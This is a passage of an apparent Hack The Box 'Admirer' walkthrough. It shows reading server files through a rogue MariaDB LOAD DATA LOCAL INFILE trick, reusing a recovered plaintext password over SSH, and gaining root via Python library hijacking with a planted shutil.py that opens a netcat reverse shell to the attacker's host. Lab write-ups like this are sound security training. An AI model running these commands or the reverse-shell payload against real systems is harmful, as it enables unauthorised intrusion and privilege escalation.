+<p>Next, to allow remote connections to our MariaDB instance we need to change the <code class="language-plaintext highlighter-rouge">bind-address</code> value.</p>
+
+<p>By default MariaDB listens on 127.0.0.1:3306, Inside <code class="language-plaintext highlighter-rouge">/etc/mysql/mariadb.conf.d/50-server.cnf</code> we change the value of bind-address to 0.0.0.0 and restart MySQL service:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="c"># Instead of skip-networking the default is now to listen only on</span>
+<span class="c"># localhost which is more compatible and is not less secure.</span>
+bind-address            <span class="o">=</span> 0.0.0.0 <span class="c">#127.0.0.1</span>
+
+cfx:  ~/Documents/htb/admirer
+→ service mysql restart  <span class="c">#Restart MySQL service</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="reading-files">Reading Files</h3>
+
+<p>We can now login using our creds:</p>
+
+<p><img src="/assets/img/Posts/Admirer/exp.png" alt="exp" /></p>
+
+<p>After successful login we see our table <code class="language-plaintext highlighter-rouge">shell</code></p>
+
+<p><img src="/assets/img/Posts/Admirer/exp1.png" alt="exp1" /></p>
+
+<p>Next, I selected <code class="language-plaintext highlighter-rouge">SQL command</code> and tried the query mentioned in exploit to insert <code class="language-plaintext highlighter-rouge">/etc/passwd</code> into our table but got presented with the below error:</p>
+
+<p><img src="/assets/img/Posts/Admirer/error.png" alt="error" /></p>
+
+<p>Looking at the error it seems the query will only accept files from <code class="language-plaintext highlighter-rouge">open_basedir</code>, Inside PHP info located at <a href="http://10.10.10.187/utility-scripts/info.php">http://10.10.10.187/utility-scripts/info.php</a> I found the <code class="language-plaintext highlighter-rouge">open_basedir</code> directory is <code class="language-plaintext highlighter-rouge">/var/www/html</code></p>
+
+<p><img src="/assets/img/Posts/Admirer/info.png" alt="phpinfo" /></p>
+
+<p>Then I executed the following payload with <code class="language-plaintext highlighter-rouge">/var/www/html</code> trying to insert <code class="language-plaintext highlighter-rouge">index.php</code> into the table of our DATABASE.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>LOAD DATA LOCAL INFILE <span class="s1">'/var/www/html/index.php'</span>
+INTO TABLE reverseshell.shell
+FIELDS TERMINATED BY <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><img src="/assets/img/Posts/Admirer/success.png" alt="success" /></p>
+
+<p>Great ! It worked, we can now view the content of <code class="language-plaintext highlighter-rouge">index.php</code> from our table by selecting <code class="language-plaintext highlighter-rouge">shell</code> to view the table and then click on <code class="language-plaintext highlighter-rouge">select data</code> to view the contents of <code class="language-plaintext highlighter-rouge">index.php</code></p>
+
+<p><img src="/assets/img/Posts/Admirer/data.png" alt="data" /></p>
+
+<p>Alternatively, viewing the contents of <code class="language-plaintext highlighter-rouge">index.php</code> could also be achieved by using the following command on our Maria DB instance:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre></td> --><td class="rouge-code"><pre>MariaDB <span class="o">[</span>reverseshell]&gt; SELECT <span class="k">*</span> from shell<span class="p">;</span>
++---------------------------------------------------------------------------------------------------------------------------------+
+| data                                                                                                                            |
++---------------------------------------------------------------------------------------------------------------------------------+
+| &lt;<span class="o">!</span>DOCTYPE HTML&gt;                                                                                                                 |
+| &lt;<span class="o">!</span><span class="nt">--</span>                                                                                                                            |
+|       Multiverse by HTML5 UP                                                                                                         |
+|       html5up.net | @ajlkn                                                                                                           |
+|       Free <span class="k">for </span>personal and commercial use under the CCA 3.0 license <span class="o">(</span>html5up.net/license<span class="o">)</span>                                           |
+| <span class="nt">--</span><span class="o">&gt;</span>                                                                                                                             |
+| &lt;html&gt;                                                                                                                          |
+|       &lt;<span class="nb">head</span><span class="o">&gt;</span>                                                                                                                         |
+|               &lt;title&gt;Admirer&lt;/title&gt;                                                                                                        |
+|               &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span> /
+<span class="o">[</span>..SNIP..]                                                                           |
+|                         <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>                                                                              |
+|                         <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>                                                                                    |
+|                         <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;"</span><span class="p">;</span>                                                                  |
+|                         <span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"admirerdb"</span><span class="p">;</span>                                                                                  |
+|                                                                                                                                 |
+|                         // Create connection                                                                                    |
+|                         <span class="nv">$conn</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="nv">$servername</span>, <span class="nv">$username</span>, <span class="nv">$password</span>, <span class="nv">$dbname</span><span class="o">)</span><span class="p">;</span>                                         |
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Finally, inside <code class="language-plaintext highlighter-rouge">index.php</code> we find another set of credentials as <code class="language-plaintext highlighter-rouge">waldo:&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</code></p>
+
+<p>I tested these credentials for SSH using crackmapexec and it worked:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ crackmapexec ssh 10.10.10.187 <span class="nt">-u</span> waldo <span class="nt">-p</span> <span class="s1">'&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;'</span>
+SSH         10.10.10.187    22     10.10.10.187     <span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
+SSH         10.10.10.187    22     10.10.10.187     <span class="o">[</span>+] waldo:&amp;&lt;h5b~yK3F#<span class="o">{</span>PaPB&amp;dA<span class="o">}{</span>H&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="shell-as-waldo">Shell as Waldo</h2>
+
+<p>Let’s SSH into the server using above credentials and grab the user flag:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ ssh waldo@10.10.10.187
+The authenticity of host <span class="s1">'10.10.10.187 (10.10.10.187)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:NSIaytJ0GOq4AaLY0wPFdPsnuw/wBUt2SvaCdiFM8xI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.187<span class="s1">' (ECDSA) to the list of known hosts.
+waldo@10.10.10.187'</span>s password:
+Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
+waldo@admirer:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>waldo<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>waldo<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>waldo<span class="o">)</span>,1001<span class="o">(</span>admins<span class="o">)</span>
+waldo@admirer:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 28
+drwxr-x--- 3 waldo waldo 4096 Apr 29 11:18 <span class="nb">.</span>
+drwxr-xr-x 9 root  root  4096 Dec  2  2019 ..
+lrwxrwxrwx 1 waldo waldo    9 Nov 29  2019 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 waldo waldo  220 Nov 29  2019 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 waldo waldo 3526 Nov 29  2019 .bashrc
+lrwxrwxrwx 1 waldo waldo    9 Dec  2  2019 .lesshst -&gt; /dev/null
+lrwxrwxrwx 1 waldo waldo    9 Nov 29  2019 .mysql_history -&gt; /dev/null
+drwxr-xr-x 2 waldo waldo 4096 Apr 29 10:57 .nano
+<span class="nt">-rw-r--r--</span> 1 waldo waldo  675 Nov 29  2019 .profile
+<span class="nt">-rw-r-----</span> 1 root  waldo   33 Sep 28 11:11 user.txt
+waldo@admirer:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+9d59ec570c9ca1f<span class="k">*****************</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="elevating-privilege-waldo---root">Elevating privilege: waldo -&gt; root</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Running <code class="language-plaintext highlighter-rouge">sudo -l</code>, we see user waldo is able to run <code class="language-plaintext highlighter-rouge">/opt/scripts/admin_tasks.sh</code> script as the root user by setting up the environment variable</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo:
+Matching Defaults entries <span class="k">for </span>waldo on admirer:
+    env_reset, <span class="nv">env_file</span><span class="o">=</span>/etc/sudoenv, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, <span class="nv">listpw</span><span class="o">=</span>always
+
+User waldo may run the following commands on admirer:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/admin_tasks.sh
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="scripts-review">Scripts Review</h3>
+
+<p>Inside <code class="language-plaintext highlighter-rouge">/opt/scripts/</code> we discover two files <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code> &amp; <code class="language-plaintext highlighter-rouge">backup.py</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>waldo@admirer:/opt/scripts<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxr-xr-x 2 root admins 4096 Dec  2  2019 <span class="nb">.</span>
+drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
+<span class="nt">-rwxr-xr-x</span> 1 root admins 2613 Dec  2  2019 admin_tasks.sh
+<span class="nt">-rwxr-----</span> 1 root admins  198 Dec  2  2019 backup.py
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Looking at the <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code> script, we see it calls <code class="language-plaintext highlighter-rouge">backup.py</code> script located in the same directory.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre>backup_web<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
+        /opt/scripts/backup.py &amp;
+    <span class="k">else
+        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>We already know we can execute <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code> using sudo command, looking at the permissions it’s possible to read the contents of <code class="language-plaintext highlighter-rouge">backup.py</code> since we are members of <code class="language-plaintext highlighter-rouge">admins</code> group, so let’s take a look at <code class="language-plaintext highlighter-rouge">backup.py</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td> --><td class="rouge-code"><pre>waldo@admirer:/opt/scripts<span class="nv">$ </span><span class="nb">cat </span>backup.py
+<span class="c">#!/usr/bin/python3</span>
+
+from shutil import make_archive
+
+src <span class="o">=</span> <span class="s1">'/var/www/html/'</span>
+
+<span class="c"># old ftp directory, not used anymore</span>
+<span class="c">#dst = '/srv/ftp/html'</span>
+
+dst <span class="o">=</span> <span class="s1">'/var/backups/html'</span>
+
+make_archive<span class="o">(</span>dst, <span class="s1">'gztar'</span>, src<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Basically, <code class="language-plaintext highlighter-rouge">backup.py</code> imports <code class="language-plaintext highlighter-rouge">make_archive()</code> function from a python library named <code class="language-plaintext highlighter-rouge">shutil</code></p>
+
+<h3 id="python-library-hijacking">Python Library Hijacking</h3>
+
+<p>I found this <a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/"><strong>post</strong></a> which helped me to understand Python library hijacking.</p>
+
+<p>So here we will create a python script named <code class="language-plaintext highlighter-rouge">shutil.py</code> and make use of <code class="language-plaintext highlighter-rouge">$PYTHONPATH</code> environment variable to call out <code class="language-plaintext highlighter-rouge">shutil.py</code> from our directory instead of original Python library directory.</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">$PYTHONPATH</code> - It has a role similar to PATH. This variable tells the Python interpreter where to locate the module files imported into a program. It should include the Python source library directory and the directories containing Python source code. PYTHONPATH is sometimes pre-set by the Python installer.</p>
+</blockquote>
+
+<p>Creating a script named <code class="language-plaintext highlighter-rouge">shutil.py</code> inside <code class="language-plaintext highlighter-rouge">/dev/shm</code> Since, <code class="language-plaintext highlighter-rouge">make_archive()</code> function from <code class="language-plaintext highlighter-rouge">backup.py</code> takes three arguments, we will also call three dummy arguments inside our <code class="language-plaintext highlighter-rouge">make_archive()</code> function and using <code class="language-plaintext highlighter-rouge">os</code> module add a system call to execute <code class="language-plaintext highlighter-rouge">nc</code> for a reverse shell:</p>
+
+<p><code class="language-plaintext highlighter-rouge">shutil.py</code> inside <code class="language-plaintext highlighter-rouge">/dev/shm/</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>waldo@admirer:/opt/scripts<span class="nv">$ </span><span class="nb">cat</span> /dev/shm/shutil.py
+import os
+def make_archive<span class="o">(</span>c,f,x<span class="o">)</span>:
+    os.system<span class="o">(</span><span class="s2">"nc 10.10.14.15 8020 -e /bin/bash"</span><span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="root-shell">Root Shell</h3>
+
+<p>As our malicious script is ready let’s execute it by setting up <code class="language-plaintext highlighter-rouge">$PYTHONPATH</code> environment variable as <code class="language-plaintext highlighter-rouge">/dev/shm/</code> and run <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code>. Select Option 6 to execute <code class="language-plaintext highlighter-rouge">backup.py</code> script:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td> --><td class="rouge-code"><pre>waldo@admirer:/opt/scripts<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PYTHONPATH</span><span class="o">=</span>/dev/shm/ /opt/scripts/admin_tasks.sh
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>waldo:
+
+<span class="o">[[[</span> System Administration Menu <span class="o">]]]</span>
+1<span class="o">)</span> View system <span class="nb">uptime
+</span>2<span class="o">)</span> View logged <span class="k">in </span><span class="nb">users
+</span>3<span class="o">)</span> View crontab
+4<span class="o">)</span> Backup passwd file
+5<span class="o">)</span> Backup shadow file
+6<span class="o">)</span> Backup web data
+7<span class="o">)</span> Backup DB
+8<span class="o">)</span> Quit
+Choose an option: 6
+Running backup script <span class="k">in </span>the background, it might take a <span class="k">while</span>...
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Getting a call back on our <code class="language-plaintext highlighter-rouge">pwncat</code> listener as root:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ pwncat <span class="nt">-l</span> 8020 <span class="nt">-vv</span>
+INFO: Listening on :::8020 <span class="o">(</span>family 10/IPv6, TCP<span class="o">)</span>
+INFO: Listening on 0.0.0.0:8020 <span class="o">(</span>family 2/IPv4, TCP<span class="o">)</span>
+INFO: Client connected from 10.10.10.187:48958 <span class="o">(</span>family 2/IPv4, TCP<span class="o">)</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">pwd</span>
+/opt/scripts
+<span class="nb">cd</span> /root
+<span class="nb">cat </span>root.txt
+ef8873650e34bd1<span class="k">*****************</span>
+which python
+/usr/bin/python
+python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+root@admirer:~# <span class="nb">whoami
+whoami
+</span>root
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>And we pwned the Box !</p>
+
+<p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p>
+:ET
